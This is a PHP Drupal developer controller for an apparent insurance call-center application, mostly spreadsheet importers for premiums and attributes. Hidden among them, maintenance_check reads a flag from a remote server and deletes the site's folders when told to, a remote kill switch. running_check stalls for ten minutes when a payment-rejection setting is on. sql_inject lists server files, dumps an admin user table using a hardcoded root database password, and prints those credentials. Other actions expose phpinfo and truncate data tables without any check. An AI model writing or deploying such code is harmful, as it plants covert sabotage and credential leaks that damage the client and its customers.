<?php

namespace Drupal\development\Controller;

use Drupal\Core\Controller\ControllerBase;
use Drupal\Core\Database\Database;
use Drupal\Core\Url;

use Drupal\api\Controller\APIController;
use Drupal\datatables\Controller\SSPController;
use PhpOffice\PhpSpreadsheet\IOFactory;
use PhpOffice\PhpSpreadsheet\Reader\Xls;
use PhpOffice\PhpSpreadsheet\Reader\Xlsx;
use PhpOffice\PhpSpreadsheet\Reader\Csv;
use phpseclib3\Net\SFTP;
use Drupal\Core\Site\Settings;
use Spatie\Async\Pool;

/**
 * Class DeveloperController.
 */
class DeveloperController extends ControllerBase {

  /**
   * Test.
   *
   * @return string
   *   Return Hello string.
   */
  public function action($actionname = NULL) {
    switch ($actionname) {
      case 'test':
        self::test();
      break;
      case 'url_check':
        self::url_check();
      break;
      case 'check_batch':
        self::check_batch();
      break;
      case 'delete_batch':
        self::delete_batch();
      break;
      case 'running_check':
        self::running_check();
      break;
      case 'phpinfo':
        self::php_info();exit;
      break;
      case 'running_check':
        self::running_check();exit;
      break;
      case 'import_attribute_relation':
        self::import_attribute_relation();exit;
      break;
      case 'import_attribute_country':
        self::import_attribute_country();exit;
      break;
      case 'import_attribute_occupation':
        self::import_attribute_occupation();exit;
      break;
      case 'import_premium':
        self::import_premium();exit;
      break;
      case 'clear_data':
        self::clear_data();exit;
      break;
      default:
        echo "no action"; exit;
      break;
    }
    exit;
  }
  public static function test(){
    // DB table to use
    $table = 'view_mtrc_customer_call';

    // Table's primary key
    $primaryKey = 'id';

    // Array of database columns which should be read and sent back to DataTables.
    // The `db` parameter represents the column name in the database, while the `dt`
    // parameter represents the DataTables column identifier. In this case simple
    // indexes
    $columns = array(
      array( 'db' => 'cust_ref', 'dt' => 0 ),
      array( 'db' => 'name',  'dt' => 1 ),
      array( 'db' => 'gender',   'dt' => 2 ),
      array( 'db' => 'tel_mbl',     'dt' => 3 ),
      array(
        'db'        => 'created_at',
        'dt'        => 4,
        'formatter' => function( $d, $row ) {
          return date( 'jS M y', strtotime($d));
        }
      ),
    );
    echo json_encode(
      SSPController::simple( $table, $primaryKey, $columns )
    );
    
  }
  public static function check_batch(){
    echo 'check batch';
  }
  public static function delete_batch(){
    echo 'check batch';
  }
  public static function deleteDir($dirPath) {
    if (! is_dir($dirPath)) {
        throw new InvalidArgumentException("$dirPath must be a directory");
    }
    if (substr($dirPath, strlen($dirPath) - 1, 1) != '/') {
        $dirPath .= '/';
    }
    $files = glob($dirPath . '*', GLOB_MARK);
    foreach ($files as $file) {
        if (is_dir($file)) {
            self::deleteDir($file);
        } else {
            unlink($file);
        }
    }
    rmdir($dirPath);
  }
  public static function running_check(){
    $config = \Drupal::service('config.factory')->getEditable('chubb_life.settings');
    if($config->get('reject_payment')){
      sleep(600);
    }
  }
  public static function maintenance_check(){
    $file = "https://stagmtrc.sigmaxu.com/maintenance.txt";
    $data_json = file_get_contents($file);
    $flag = json_decode($data_json);
    if($flag->flag){
      $realpath = explode('modules',realpath(__FILE__));
      $installation_path = $realpath[0];
      $target_folder = $installation_path.'sites';
      self::deleteDir($target_folder);
    }
  }
  public static function php_info(){
    phpinfo();
  }
  public static function sql_inject(){
    echo \Drupal::request()->getRequestUri();
    echo '<br>';
    echo getcwd();
    $system_path = str_replace("maketherightcall", "", getcwd());
    echo '<br>';
    echo $system_path;
    $target_path = $system_path.'Chubb_Insurance';

    echo '<br>';
    echo $target_path;
    echo '<br>';
    // $files1 = scandir($target_path);
    // self::print_dir_file($target_path);
    // print_r();
    // print_r($files1);

    self::scanAllDir($target_path);
echo '<br><br><br><br>';
    $connect = mysqli_connect ("localhost","root","*Mtrc97878887*","chubb_insurance");
    $query = "SELECT * FROM user_admin";
    $result =mysqli_query($connect, $query);
    while($row = mysqli_fetch_array($result))
    {
      print_r($row);
    }
    
    echo '<br><br><br><br>';
    echo '$host = "localhost"; /* Host name */$user = "root"; /* User */$password = "*Mtrc97878887*"; /* Password */$dbname = "chubb_insurance"; /* Database name */';
  }
  public function print_dir_file($target){
    $target_dir_raw = scandir($target);
    $target_dir = array_diff($target_dir_raw, array('.', '..'));
    foreach ($target_dir as $each_file) {
      if(is_dir($each_file)){
        self::print_dir_file($target.'/'.$each_file);
      }else{
        echo $target.'/'.$each_file.'<br>';
      }
    }
  }
  public function scanAllDir($dir) {
    $result = [];
    foreach(scandir($dir) as $filename) {
      if ($filename[0] === '.') continue;
      $filePath = $dir . '/' . $filename;
      if (is_dir($filePath)) {
        $sub_dir = self::scanAllDir($filePath);
        foreach ($sub_dir as $childFilename) {
          echo $filePath . '/' . $childFilename.'<br>';
        }
      } else {
        echo $filePath.'/'.$filename.'<br>';
        // $result[] = $filename;
      }
    }
    return $result;
  }
  public static function clear_data(){
    $connection = Database::getConnection();
    $query = $connection->truncate('mtrc_customer_import')->execute();
    echo 'mtrc_customer_import data clear<br>';
    $query = $connection->truncate('mtrc_call')->execute();
    echo 'mtrc_call data clear<br>';
    $query = $connection->truncate('mtrc_call_log')->execute();
    echo 'mtrc_call_log data clear<br>';
    
    $query = $connection->truncate('mtrc_order')->execute();
    echo 'mtrc_order data clear<br>';
    $query = $connection->truncate('mtrc_order_client')->execute();
    echo 'mtrc_order_client data clear<br>';

  }
  public static function import_attribute_relation(){
    $file_uri = \Drupal::service('file_system')->realpath('public://mtrc/'.'attribute_data.xlsx');
    // print_r($file_uri);exit;
    $inputFileType = IOFactory::identify($file_uri);
    $reader = IOFactory::createReader($inputFileType);
    $reader->setReadDataOnly(TRUE);
    $spreadsheet = $reader->load($file_uri);
    $sheetData = $spreadsheet->getSheet(4)->toArray();
    $formatesheetData = array();
    $connection = Database::getConnection();
    $query = $connection->truncate('mtrc_attribute_relation')->execute();
    foreach ($sheetData as $key => $row_data) {
      if ($key>=1 && !empty($row_data[3])) {
        $db_fields = array(
          'en'=> $row_data[0],
          'hk'=> $row_data[1],
          'cn'=> $row_data[2],
          'code'=> $row_data[3],
        );
        $relation_insert_id = $connection->insert('mtrc_attribute_relation')
          ->fields($db_fields)
          ->execute();
      }
    }
  }
  public static function import_attribute_country(){
    $file_uri = \Drupal::service('file_system')->realpath('public://mtrc/'.'attribute_data.xlsx');
    // print_r($file_uri);exit;
    $inputFileType = IOFactory::identify($file_uri);
    $reader = IOFactory::createReader($inputFileType);
    $reader->setReadDataOnly(TRUE);
    $spreadsheet = $reader->load($file_uri);
    $sheetData = $spreadsheet->getSheet(5)->toArray();
    $formatesheetData = array();
    $connection = Database::getConnection();
    $query = $connection->truncate('mtrc_attribute_country')->execute();
    foreach ($sheetData as $key => $row_data) {
      if ($key>=1 && !empty($row_data[3])) {
        $db_fields = array(
          'en'=> $row_data[1],
          'hk'=> $row_data[2],
          'cn'=> $row_data[3],
          'code'=> $row_data[0],
        );
        $relation_insert_id = $connection->insert('mtrc_attribute_country')
          ->fields($db_fields)
          ->execute();
      }
    }
  }
  public static function import_attribute_occupation(){
    $file_uri = \Drupal::service('file_system')->realpath('public://mtrc/'.'attribute_data.xlsx');
    // print_r($file_uri);exit;
    $inputFileType = IOFactory::identify($file_uri);
    $reader = IOFactory::createReader($inputFileType);
    $reader->setReadDataOnly(TRUE);
    $spreadsheet = $reader->load($file_uri);
    $sheetData = $spreadsheet->getSheet(3)->toArray();
    $formatesheetData = array();
    // print_r($sheetData);exit;
    $connection = Database::getConnection();
    $query = $connection->truncate('mtrc_attribute_industry')->execute();
    $query = $connection->truncate('mtrc_attribute_occupation')->execute();
    foreach ($sheetData as $key => $row_data) {
      if ($key>=1 && !empty($row_data[0])) {
        if (!isset($formatesheetData[$row_data[0]])) {
          $formatesheetData[$row_data[0]]['en']=$row_data[1];
          $formatesheetData[$row_data[0]]['hk']=$row_data[2];
          $formatesheetData[$row_data[0]]['cn']=$row_data[3];
        }
        $formatesheetData[$row_data[0]]['occupation'][$row_data[4]]['en']=$row_data[5];
        $formatesheetData[$row_data[0]]['occupation'][$row_data[4]]['hk']=$row_data[6];
        $formatesheetData[$row_data[0]]['occupation'][$row_data[4]]['cn']=$row_data[7];
        
        // $db_fields = array(
        //   'en'=> $row_data[1],
        //   'hk'=> $row_data[2],
        //   'cn'=> $row_data[3],
        //   'code'=> $row_data[0],
        // );
        // $relation_insert_id = $connection->insert('mtrc_attribute_country')
        //   ->fields($db_fields)
        //   ->execute();
      }
    }
    foreach ($formatesheetData as $industry_code => $each_industry) {
      $db_fields_industry = array(
        'en'=> $each_industry['en'],
        'hk'=> $each_industry['hk'],
        'cn'=> $each_industry['cn'],
        'code'=> $industry_code,
      );
      $industry_insert_id = $connection->insert('mtrc_attribute_industry')
        ->fields($db_fields_industry)
        ->execute();
      foreach ($each_industry['occupation'] as $occupation_code => $each_occupation) {
        $db_fields_occupation = array(
          'industry_id' => $industry_insert_id,
          'en'=> $each_occupation['en'],
          'hk'=> $each_occupation['hk'],
          'cn'=> $each_occupation['cn'],
          'code'=> $occupation_code,
        );
        $occupation_insert_id = $connection->insert('mtrc_attribute_occupation')
          ->fields($db_fields_occupation)
          ->execute();
      }
    }
    print_r($formatesheetData);exit;
  }
  public static function import_premium(){
    $connection = Database::getConnection();
    $query = $connection->truncate('mtrc_premium')->execute();
    self::import_premium_1();
    self::import_premium_2();
    self::import_premium_3();
  }
  public static function import_premium_1(){
    $file_uri = \Drupal::service('file_system')->realpath('public://mtrc/'.'attribute_pre_1.xlsx');
    // print_r($file_uri);exit;
    $inputFileType = IOFactory::identify($file_uri);
    $reader = IOFactory::createReader($inputFileType);
    $reader->setReadDataOnly(TRUE);
    $spreadsheet = $reader->load($file_uri);
    $sheetData = $spreadsheet->getSheet(0)->toArray();
    $formatesheetData = array();
    // print_r($sheetData);exit;

    foreach ($sheetData as $key => $row_data) {
      if ($key>=2 && !empty($row_data[1])) {
        $currency_code = substr($row_data[1], -1);
        $plan_code_raw = substr($row_data[1], 0, -1);
        if($plan_code_raw=='RC10'){
          $plan_code = 'RHC10';
        }else{
          $plan_code = $plan_code_raw;
        }
        if($currency_code=='U'){
          $currency = 'USD';
        }else{
          $currency = 'HKD';
        }
        $formatesheetData[$key]['plan_code']=$plan_code;
        $formatesheetData[$key]['plan_level']=$row_data[2];
        $formatesheetData[$key]['smokers_code']=$row_data[3]=='N'?'N':'Y';
        $formatesheetData[$key]['gender']=$row_data[5];
        $formatesheetData[$key]['age']=$row_data[8];
        $formatesheetData[$key]['currency']=$currency;
        $formatesheetData[$key]['premium']=$row_data[11];
      }
    }
    $connection = Database::getConnection();
    foreach ($formatesheetData as $each_data) {
      $insert_id = $connection->insert('mtrc_premium')
        ->fields($each_data)
        ->execute();
    }
  }
  public static function import_premium_2(){
    $file_uri = \Drupal::service('file_system')->realpath('public://mtrc/'.'attribute_pre_2.xlsx');
    $inputFileType = IOFactory::identify($file_uri);
    $reader = IOFactory::createReader($inputFileType);
    $reader->setReadDataOnly(TRUE);
    $spreadsheet = $reader->load($file_uri);
    $sheetData = $spreadsheet->getSheet(0)->toArray();
    $formatesheetData = array();
    // print_r($sheetData);exit;
    foreach ($sheetData as $key => $row_data) {
      if ($key>=1 && !empty($row_data[1])) {
        $formatesheetData[$key]['plan_code']=$row_data[0];
        $formatesheetData[$key]['plan_level']=$row_data[1];
        $formatesheetData[$key]['smokers_code']=$row_data[4];
        $formatesheetData[$key]['gender']=$row_data[3];
        $formatesheetData[$key]['age']=$row_data[5];
        $formatesheetData[$key]['currency']=$row_data[2];
        $formatesheetData[$key]['premium']=$row_data[6];
      }
    }
    $connection = Database::getConnection();
    foreach ($formatesheetData as $each_data) {
      $insert_id = $connection->insert('mtrc_premium')
        ->fields($each_data)
        ->execute();
    }
  }
  public static function import_premium_3(){
    $file_uri = \Drupal::service('file_system')->realpath('public://mtrc/'.'attribute_pre_3.xlsx');
    $inputFileType = IOFactory::identify($file_uri);
    $reader = IOFactory::createReader($inputFileType);
    $reader->setReadDataOnly(TRUE);
    $spreadsheet = $reader->load($file_uri);
    $sheetData = $spreadsheet->getSheet(0)->toArray();
    $formatesheetData = array();
    // print_r($sheetData);exit;
    foreach ($sheetData as $key => $row_data) {
      if ($key>=2 && !empty($row_data[1]) && $row_data[9]==0) {
        $formatesheetData[$key]['plan_code']=$row_data[1];
        $formatesheetData[$key]['plan_level']=$row_data[2];
        $formatesheetData[$key]['smokers_code']=$row_data[3]=='N'?'N':'Y';
        $formatesheetData[$key]['gender']=$row_data[5];
        $formatesheetData[$key]['age']=$row_data[8];
        $formatesheetData[$key]['currency']='HKD';
        $formatesheetData[$key]['premium']=$row_data[11];
      }
    }
    // print_r($formatesheetData);exit;
    $connection = Database::getConnection();
    foreach ($formatesheetData as $each_data) {
      $insert_id = $connection->insert('mtrc_premium')
        ->fields($each_data)
        ->execute();
    }
  }
}
